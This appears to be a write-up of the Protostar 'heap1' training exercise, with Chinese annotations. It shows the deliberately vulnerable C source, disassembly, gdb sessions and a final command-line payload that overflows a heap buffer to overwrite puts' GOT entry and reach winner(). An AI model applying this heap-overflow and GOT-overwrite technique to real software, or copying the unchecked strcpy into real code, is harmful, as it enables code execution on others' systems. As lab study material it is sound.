#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

  

struct internet {
  int priority;
  char *name;
};

void winner()
{
  printf("and we have a winner @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  struct internet *i1, *i2, *i3;

  i1 = malloc(sizeof(struct internet));
  i1->priority = 1;
  i1->name = malloc(8);

  i2 = malloc(sizeof(struct internet));
  i2->priority = 2;
  i2->name = malloc(8);

  strcpy(i1->name, argv[1]);
  strcpy(i2->name, argv[2]);  /* i2->name: 第一个strcpy溢出可以控制，argv[2]可以控制，任意地址写入任意数据*/


  printf("and that's a wrap folks!\n");
}

objdump -d heap1

0804839c <printf@plt>:
 804839c:       ff 25 68 97 04 08       jmp    *0x8049768  
 80483a2:       68 18 00 00 00          push   $0x18
 80483a7:       e9 b0 ff ff ff          jmp    804835c <_init+0x30>

080483cc <puts@plt>:
 80483cc:       ff 25 74 97 04 08       jmp    *0x8049774 (写入的地址)
 80483d2:       68 30 00 00 00          push   $0x30
 80483d7:       e9 80 ff ff ff          jmp    804835c <_init+0x30>

(gdb) p printf
$2 = {<text variable, no debug info>} 0xb7edbf90 <__printf>
(gdb) p winner
$1 = {void (void)} 0x8048494 <winner>    (写入的值)
(gdb) disass main
Dump of assembler code for function main:
0x080484b9 <main+0>:    push   %ebp
0x080484ba <main+1>:    mov    %esp,%ebp
0x080484bc <main+3>:    and    $0xfffffff0,%esp
0x080484bf <main+6>:    sub    $0x20,%esp
0x080484c2 <main+9>:    movl   $0x8,(%esp)
0x080484c9 <main+16>:   call   0x80483bc <malloc@plt>
0x080484ce <main+21>:   mov    %eax,0x14(%esp)
0x080484d2 <main+25>:   mov    0x14(%esp),%eax
0x080484d6 <main+29>:   movl   $0x1,(%eax)
0x080484dc <main+35>:   movl   $0x8,(%esp)
0x080484e3 <main+42>:   call   0x80483bc <malloc@plt>
0x080484e8 <main+47>:   mov    %eax,%edx
0x080484ea <main+49>:   mov    0x14(%esp),%eax
0x080484ee <main+53>:   mov    %edx,0x4(%eax)
0x080484f1 <main+56>:   movl   $0x8,(%esp)
0x080484f8 <main+63>:   call   0x80483bc <malloc@plt>
0x080484fd <main+68>:   mov    %eax,0x18(%esp)
0x08048501 <main+72>:   mov    0x18(%esp),%eax
0x08048505 <main+76>:   movl   $0x2,(%eax)
0x0804850b <main+82>:   movl   $0x8,(%esp)
0x08048512 <main+89>:   call   0x80483bc <malloc@plt>
0x08048517 <main+94>:   mov    %eax,%edx
0x08048519 <main+96>:   mov    0x18(%esp),%eax
0x0804851d <main+100>:  mov    %edx,0x4(%eax)
0x08048520 <main+103>:  mov    0xc(%ebp),%eax
0x08048523 <main+106>:  add    $0x4,%eax
0x08048526 <main+109>:  mov    (%eax),%eax
0x08048528 <main+111>:  mov    %eax,%edx
0x0804852a <main+113>:  mov    0x14(%esp),%eax
0x0804852e <main+117>:  mov    0x4(%eax),%eax
0x08048531 <main+120>:  mov    %edx,0x4(%esp)
0x08048535 <main+124>:  mov    %eax,(%esp)
0x08048538 <main+127>:  call   0x804838c <strcpy@plt>
0x0804853d <main+132>:  mov    0xc(%ebp),%eax
0x08048540 <main+135>:  add    $0x8,%eax
0x08048543 <main+138>:  mov    (%eax),%eax
0x08048545 <main+140>:  mov    %eax,%edx
0x08048547 <main+142>:  mov    0x18(%esp),%eax
0x0804854b <main+146>:  mov    0x4(%eax),%eax
0x0804854e <main+149>:  mov    %edx,0x4(%esp)
0x08048552 <main+153>:  mov    %eax,(%esp)
0x08048555 <main+156>:  call   0x804838c <strcpy@plt> /* strcpy(i2->name, argv[2]) */
0x0804855a <main+161>:  movl   $0x804864b,(%esp)
0x08048561 <main+168>:  call   0x80483cc <puts@plt>
0x08048566 <main+173>:  leave  
0x08048567 <main+174>:  ret    
End of assembler dump.

(gdb) r $(perl -e 'print "AAAA"x(5)."BBBB"') c
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/heap1 $(perl -e 'print "AAAA"x(5)."BBBB"') c

Breakpoint 1, 0x08048555 in main (argc=3, argv=0xbffff7b4) at heap1/heap1.c:32
32      in heap1/heap1.c
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
*__GI_strcpy (dest=0x42424242 <Address 0x42424242 out of bounds>, src=0xbffff90d "c") at strcpy.c:40
40      strcpy.c: No such file or directory.
        in strcpy.c
(gdb) 

user@protostar:/opt/protostar/bin$ ./heap1 $(perl -e 'print "AAAA"x(5)."\x74\x97\x04\x08"') $(perl -e 'print "\x94\x84\x04\x08"')  
and we have a winner @ 1394326282
user@protostar:/opt/protostar/bin$ 